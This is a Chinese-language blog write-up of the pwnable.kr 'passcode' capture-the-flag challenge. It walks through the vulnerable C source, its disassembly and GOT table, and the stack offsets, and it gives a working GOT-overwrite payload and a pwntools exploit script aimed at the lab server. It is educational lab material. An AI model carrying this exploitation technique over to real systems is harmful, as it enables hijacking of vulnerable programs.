@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>pwnable  passcode - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">pwnable  passcode</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1651041739317"
+                  >2022-04-27 14:42</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1651041758482"
+                  >2022-04-27 14:42</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><a title="https://blog.csdn.net/qq_20307987/article/details/51303824" href="https://blog.csdn.net/qq_20307987/article/details/51303824">参考</a></p>
+<p><strong>知识点：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-built_in">EIP</span>、<span class="hljs-built_in">EBP</span>、<span class="hljs-built_in">ESP</span>的作用：
+<span class="hljs-built_in">EIP</span>存储着下一条指令的地址，每执行一条指令，该寄存器变化一次
+
+<span class="hljs-built_in">EBP</span>存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）
+
+<span class="hljs-built_in">ESP</span>就是前面说的，始终指向栈顶，只要<span class="hljs-built_in">ESP</span>指向变了，那么当前栈顶就变了</code></pre></div>
+<hr />
+<div><pre class="hljs"><code>Mommy told <span class="hljs-keyword">me</span> <span class="hljs-keyword">to</span> make a passcode based login system.
+My initial C code was compiled <span class="hljs-keyword">without</span> any <span class="hljs-keyword">error</span>!
+Well, there was <span class="hljs-keyword">some</span> compiler warning, <span class="hljs-keyword">but</span> who cares <span class="hljs-keyword">about</span> <span class="hljs-keyword">that</span>?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)</code></pre></div>
+<p><strong>ssh passcode@pwnable.kr -p2222 (pw:guest)得到</strong></p>
+<div><pre class="hljs"><code>passcode@pwnable:~$ ls
+flag  passcode	passcode.c
+passcode@pwnable:~$ file passcode
+passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
+passcode@pwnable:~$ checksec passcode
+[*] <span class="hljs-string">'/home/passcode/passcode'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre></div>
+<p><strong>cat passcode.c</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">int</span> passcode1;
+    <span class="hljs-type">int</span> passcode2;
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"enter passcode1 : "</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, passcode1);     <span class="hljs-comment">//由于少了取地址符号&amp;，可以以passcode值寻址到的内存地址进行覆盖</span>
+    fflush(<span class="hljs-built_in">stdin</span>);
+
+    <span class="hljs-comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"enter passcode2 : "</span>);
+        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, passcode2);
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"checking...\n"</span>);
+    <span class="hljs-keyword">if</span>(passcode1==<span class="hljs-number">338150</span> &amp;&amp; passcode2==<span class="hljs-number">13371337</span>){
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Login OK!\n"</span>);
+                system(<span class="hljs-string">"/bin/cat flag"</span>);
+        }
+        <span class="hljs-keyword">else</span>{
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Login Failed!\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+        }
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">welcome</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">char</span> name[<span class="hljs-number">100</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"enter you name : "</span>);
+    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%100s"</span>, name);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome %s!\n"</span>, name);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Toddler's Secure Login System 1.0 beta.\n"</span>);
+
+    welcome();
+    login();
+
+    <span class="hljs-comment">// something after login...</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now I can safely trust you that you have credential :)\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre></div>
+<p><strong>尝试运行passcode</strong></p>
+<div><pre class="hljs"><code>passcode@pwnable:~$ ./passcode 
+Toddler<span class="hljs-string">'s Secure Login System 1.0 beta.
+enter you name : admin
+Welcome admin!
+enter passcode1 : dsj
+enter passcode2 : checking...
+Login Failed!</span></code></pre></div>
+<p><strong>PS:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">fflush</span>(<span class="hljs-variable">stdin</span>)是一个计算机专业术语，功能是清空输入缓冲区
+通常是为了确保不影响后面的数据读取(例如在读完一个字符串后紧接着又要读取一个字符，此时应该先执行<span class="hljs-title">fflush</span>(<span class="hljs-variable">stdin</span>)</span></code></pre></div>
+<hr />
+<p><strong>objdump查看函数：</strong></p>
+<div><pre class="hljs"><code>passcode@pwnable:~$ objdump -t -j .text passcode
+
+passcode:     file format elf32-i386
+
+SYMBOL TABLE:
+080484b0 l    d  .text	00000000              .text
+080484e0 l     F .text	00000000              __do_global_dtors_aux
+08048540 l     F .text	00000000              frame_dummy
+08048720 l     F .text	00000000              __do_global_ctors_aux
+08048710 g     F .text	00000002              __libc_csu_fini
+08048712 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
+08048564 g     F .text	000000a5              login
+08048609 g     F .text	0000005c              welcome
+080486a0 g     F .text	00000061              __libc_csu_init
+080484b0 g     F .text	00000000              _start
+08048665 g     F .text	00000032              main</code></pre></div>
+<p><strong>使用gdb进行调试：</strong></p>
+<div><pre class="hljs"><code>(gdb) disass main
+Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> main:
+   0x08048665 &lt;+0&gt;:	push   %ebp
+   0x08048666 &lt;+1&gt;:	mov    %esp,%ebp
+   0x08048668 &lt;+3&gt;:	and    <span class="hljs-variable">$0xfffffff0</span>,%esp
+   0x0804866b &lt;+6&gt;:	sub    <span class="hljs-variable">$0x10</span>,%esp
+   0x0804866e &lt;+9&gt;:	movl   <span class="hljs-variable">$0x80487f0</span>,(%esp)
+   0x08048675 &lt;+16&gt;:	call   0x8048450 &lt;puts@plt&gt;
+   0x0804867a &lt;+21&gt;:	call   0x8048609 &lt;welcome&gt;
+   0x0804867f &lt;+26&gt;:	call   0x8048564 &lt;login&gt;
+   0x08048684 &lt;+31&gt;:	movl   <span class="hljs-variable">$0x8048818</span>,(%esp)
+   0x0804868b &lt;+38&gt;:	call   0x8048450 &lt;puts@plt&gt;
+   0x08048690 &lt;+43&gt;:	mov    <span class="hljs-variable">$0x0</span>,%eax
+   0x08048695 &lt;+48&gt;:	leave  
+   0x08048696 &lt;+49&gt;:	ret    
+End of assembler dump.</code></pre></div>
+<div><pre class="hljs"><code>(gdb) disass welcome
+Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> welcome:
+   0x08048609 &lt;+0&gt;:	push   %ebp
+   0x0804860a &lt;+1&gt;:	mov    %esp,%ebp
+   0x0804860c &lt;+3&gt;:	sub    <span class="hljs-variable">$0x88</span>,%esp
+   0x08048612 &lt;+9&gt;:	mov    %gs:0x14,%eax
+   0x08048618 &lt;+15&gt;:	mov    %eax,-0xc(%ebp)
+   0x0804861b &lt;+18&gt;:	xor    %eax,%eax
+   0x0804861d &lt;+20&gt;:	mov    <span class="hljs-variable">$0x80487cb</span>,%eax
+   0x08048622 &lt;+25&gt;:	mov    %eax,(%esp)
+   0x08048625 &lt;+28&gt;:	call   0x8048420 &lt;<span class="hljs-built_in">printf</span>@plt&gt;
+   0x0804862a &lt;+33&gt;:	mov    <span class="hljs-variable">$0x80487dd</span>,%eax
+   0x0804862f &lt;+38&gt;:	lea    -0x70(%ebp),%edx    //name
+   0x08048632 &lt;+41&gt;:	mov    %edx,0x4(%esp)
+   0x08048636 &lt;+45&gt;:	mov    %eax,(%esp)
+   0x08048639 &lt;+48&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+   0x0804863e &lt;+53&gt;:	mov    <span class="hljs-variable">$0x80487e3</span>,%eax
+   0x08048643 &lt;+58&gt;:	lea    -0x70(%ebp),%edx
+   0x08048646 &lt;+61&gt;:	mov    %edx,0x4(%esp)
+   0x0804864a &lt;+65&gt;:	mov    %eax,(%esp)
+   0x0804864d &lt;+68&gt;:	call   0x8048420 &lt;<span class="hljs-built_in">printf</span>@plt&gt;
+   0x08048652 &lt;+73&gt;:	mov    -0xc(%ebp),%eax
+   0x08048655 &lt;+76&gt;:	xor    %gs:0x14,%eax
+   0x0804865c &lt;+83&gt;:	je     0x8048663 &lt;welcome+90&gt;
+   0x0804865e &lt;+85&gt;:	call   0x8048440 &lt;__stack_chk_fail@plt&gt;
+   0x08048663 &lt;+90&gt;:	leave  
+   0x08048664 &lt;+91&gt;:	ret    
+End of assembler dump.</code></pre></div>
+<div><pre class="hljs"><code>(gdb) disass login
+Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> login:
+   0x08048564 &lt;+0&gt;:	push   %ebp
+   0x08048565 &lt;+1&gt;:	mov    %esp,%ebp
+   0x08048567 &lt;+3&gt;:	sub    <span class="hljs-variable">$0x28</span>,%esp
+   0x0804856a &lt;+6&gt;:	mov    <span class="hljs-variable">$0x8048770</span>,%eax
+   0x0804856f &lt;+11&gt;:	mov    %eax,(%esp)
+   0x08048572 &lt;+14&gt;:	call   0x8048420 &lt;<span class="hljs-built_in">printf</span>@plt&gt;
+   0x08048577 &lt;+19&gt;:	mov    <span class="hljs-variable">$0x8048783</span>,%eax
+   0x0804857c &lt;+24&gt;:	mov    -0x10(%ebp),%edx       //passcode1
+   0x0804857f &lt;+27&gt;:	mov    %edx,0x4(%esp)
+   0x08048583 &lt;+31&gt;:	mov    %eax,(%esp)
+   0x08048586 &lt;+34&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+   0x0804858b &lt;+39&gt;:	mov    0x804a02c,%eax
+   0x08048590 &lt;+44&gt;:	mov    %eax,(%esp)
+   0x08048593 &lt;+47&gt;:	call   0x8048430 &lt;fflush@plt&gt;
+   0x08048598 &lt;+52&gt;:	mov    <span class="hljs-variable">$0x8048786</span>,%eax
+   0x0804859d &lt;+57&gt;:	mov    %eax,(%esp)
+   0x080485a0 &lt;+60&gt;:	call   0x8048420 &lt;<span class="hljs-built_in">printf</span>@plt&gt;
+   0x080485a5 &lt;+65&gt;:	mov    <span class="hljs-variable">$0x8048783</span>,%eax
+   0x080485aa &lt;+70&gt;:	mov    -0xc(%ebp),%edx      //passcode2
+   0x080485ad &lt;+73&gt;:	mov    %edx,0x4(%esp)
+   0x080485b1 &lt;+77&gt;:	mov    %eax,(%esp)
+   0x080485b4 &lt;+80&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+   0x080485b9 &lt;+85&gt;:	movl   <span class="hljs-variable">$0x8048799</span>,(%esp)
+   0x080485c0 &lt;+92&gt;:	call   0x8048450 &lt;puts@plt&gt;
+   0x080485c5 &lt;+97&gt;:	cmpl   <span class="hljs-variable">$0x528e6</span>,-0x10(%ebp)
+   0x080485cc &lt;+104&gt;:	jne    0x80485f1 &lt;login+141&gt;
+   0x080485ce &lt;+106&gt;:	cmpl   <span class="hljs-variable">$0xcc07c9</span>,-0xc(%ebp)
+   0x080485d5 &lt;+113&gt;:	jne    0x80485f1 &lt;login+141&gt;
+   0x080485d7 &lt;+115&gt;:	movl   <span class="hljs-variable">$0x80487a5</span>,(%esp)
+   0x080485de &lt;+122&gt;:	call   0x8048450 &lt;puts@plt&gt;
+   0x080485e3 &lt;+127&gt;:	movl   <span class="hljs-variable">$0x80487af</span>,(%esp)
+   0x080485ea &lt;+134&gt;:	call   0x8048460 &lt;system@plt&gt;
+   0x080485ef &lt;+139&gt;:	leave  
+   0x080485f0 &lt;+140&gt;:	ret    
+   0x080485f1 &lt;+141&gt;:	movl   <span class="hljs-variable">$0x80487bd</span>,(%esp)
+   0x080485f8 &lt;+148&gt;:	call   0x8048450 &lt;puts@plt&gt;
+   0x080485fd &lt;+153&gt;:	movl   <span class="hljs-variable">$0x0</span>,(%esp)
+   0x08048604 &lt;+160&gt;:	call   0x8048480 &lt;<span class="hljs-built_in">exit</span>@plt&gt;
+End of assembler dump.</code></pre></div>
+<p><strong>GOT表</strong></p>
+<div><pre class="hljs"><code><span class="hljs-selector-tag">pwndbg</span>&gt; <span class="hljs-selector-tag">got</span>
+
+<span class="hljs-selector-tag">GOT</span> <span class="hljs-selector-tag">protection</span>: <span class="hljs-selector-tag">Partial</span> <span class="hljs-selector-tag">RELRO</span> | <span class="hljs-selector-tag">GOT</span> <span class="hljs-selector-tag">functions</span>: <span class="hljs-selector-tag">9</span>
+ 
+<span class="hljs-selector-attr">[0x804a000]</span> <span class="hljs-selector-tag">printf</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x8048426</span> (printf<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">0</span> <span class="hljs-comment">/* 'h' */</span>
+<span class="hljs-selector-attr">[0x804a004]</span> <span class="hljs-selector-tag">fflush</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x8048436</span> (fflush<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">8</span>
+<span class="hljs-selector-attr">[0x804a008]</span> <span class="hljs-selector-tag">__stack_chk_fail</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.4</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x8048446</span> (__stack_chk_fail<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">0x10</span>
+<span class="hljs-selector-attr">[0x804a00c]</span> <span class="hljs-selector-tag">puts</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0xf7e2b480</span> (puts) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">ebp</span>
+<span class="hljs-selector-attr">[0x804a010]</span> <span class="hljs-selector-tag">system</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x8048466</span> (system<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">0x20</span> <span class="hljs-comment">/* 'h ' */</span>
+<span class="hljs-selector-attr">[0x804a014]</span> <span class="hljs-selector-tag">__gmon_start__</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x8048476</span> (__gmon_start__<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">0x28</span> <span class="hljs-comment">/* 'h(' */</span>
+<span class="hljs-selector-attr">[0x804a018]</span> <span class="hljs-selector-tag">exit</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x8048486</span> (exit<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">0x30</span> <span class="hljs-comment">/* 'h0' */</span>
+<span class="hljs-selector-attr">[0x804a01c]</span> <span class="hljs-selector-tag">__libc_start_main</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0xf7dda820</span> (__libc_start_main) ◂— <span class="hljs-selector-tag">call</span>   <span class="hljs-selector-tag">0xf7f011a9</span>
+<span class="hljs-selector-attr">[0x804a020]</span> <span class="hljs-selector-tag">__isoc99_scanf</span>@<span class="hljs-selector-tag">GLIBC_2</span><span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">0x80484a6</span> (__isoc99_scanf<span class="hljs-variable">@plt</span>+<span class="hljs-number">6</span>) ◂— <span class="hljs-selector-tag">push</span>   <span class="hljs-selector-tag">0x40</span> <span class="hljs-comment">/* 'h@' */</span></code></pre></div>
+<p>下断点分析welcome函数</p>
+<img src="/_resources/65530919bf3043919056893ba9906a24.png" alt="0e7c8ab7b10fa001580f5933a6ae2ed8.png" width="721" height="557" class="jop-noMdConv" />
+<p><strong>welcome函数ebp为0xffffd498</strong></p>
+<p><strong>且启动了gs栈检测，所以不能将返回地址直接覆盖为目标地址</strong></p>
+<p><strong><img src="/_resources/4872d55bdcec4703afe4bfb92277a530.png" alt="6419dc61c9c0f05b2b34458d7015ddb1.png" width="905" height="547" class="jop-noMdConv" /></strong></p>
+<p>可以看到，在<code>0x8048639 &lt;welcome+48&gt;: call 0x80484a0 &lt;__isoc99_scanf@plt&gt;</code> 是输入name的字符串提示，那么下一个地是就是name的地址</p>
+<p><strong>name:edx,[ebp-0x70]</strong></p>
+<p>继续往下走</p>
+<img src="/_resources/ad32baf9aee9427eb0b8d55bc03e3f83.png" alt="dad60098217a99f1636bc8b51292ccde.png" width="814" height="475" class="jop-noMdConv" />
+<p>可以看到输入的name值aaaaaa的地址是0xffffd428</p>
+<hr />
+<p>继续执行，跳转至login函数</p>
+<img src="/_resources/d909b79db0a9418bacd429f5fc4ec331.png" alt="99d4e02163a0c9845b4f1da867be32d3.png" width="807" height="699" class="jop-noMdConv" />
+<p><strong>可以发现login函数ebp也是0xffffd498，故welcome函数和login函数有相同的ebp</strong></p>
+<p>** <img src="/_resources/acd77a0f52d0457197bc1c95cde9ef06.png" alt="edcbf79e8e6ec8df60c743cb5f79779c.png" width="962" height="577" class="jop-noMdConv" />**</p>
+<p><strong>passcode1:edx,DWORD PTR [ebp-0x10]</strong></p>
+<p>已知welcome和login函数拥有同一ebp,那么name和passcode1在同一个栈空间里，可以覆写GOT</p>
+<p>name:edx,[ebp-0x70] - passcode1:edx,DWORD PTR [ebp-0x10]即 <strong>ebp-0x70 - ebp-0x10=96，即name和passcode1相差96字节</strong></p>
+<p>可以看到在login()中，执行scanf()后执行fflush()函数，可以通过name变量覆盖，将passcode1的值改为fflush()函数的地址</p>
+<p>在接下来执行login()时，fflush()函数的地址的值，通过scanf()被赋值为system地址，实行执行查看flag的命令</p>
+<p><strong><strong>找到fflush()的got表项地址为0x804a004，system()的got表项地址为0x080485e3</strong></strong></p>
+<hr />
+<p>可以得到payload = ‘a’*96+’\x04\xA0\x04\x08’+’\n’+‘134514147\n’</p>
+<hr />
+<p>python-c “‘a’*96+’\x04\xA0\x04\x08’+’\n’+‘134514147\n’”|./passcode</p>
+<hr />
+<div><pre class="hljs"><code><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-keyword">try</span>:
+    s = ssh(host=<span class="hljs-string">'pwnable.kr'</span>,user=<span class="hljs-string">'passcode'</span>,password=<span class="hljs-string">'guest'</span>,port=<span class="hljs-number">2222</span>)
+    p = s.process(<span class="hljs-string">'./passcode'</span>)
+    p.sendline(<span class="hljs-string">'a'</span>*<span class="hljs-number">96</span>+<span class="hljs-string">'\x04\xA0\x04\x08'</span>+<span class="hljs-string">'\n'</span>+<span class="hljs-string">'134514147\n'</span>)
+    p.interactive()
+<span class="hljs-keyword">except</span>:
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">'error'</span>)</code></pre></div>
+<hr />
+<p>执行exp得到flag，如下图所示：</p>
+<img src="/_resources/a95a61dbeba2422686840960aaef7611.png" alt="db8b2fc0245bad16909810e9269ea724.png" width="933" height="556" class="jop-noMdConv" /></div>
+      </article>
+    </div>
+  </body>
+</html>
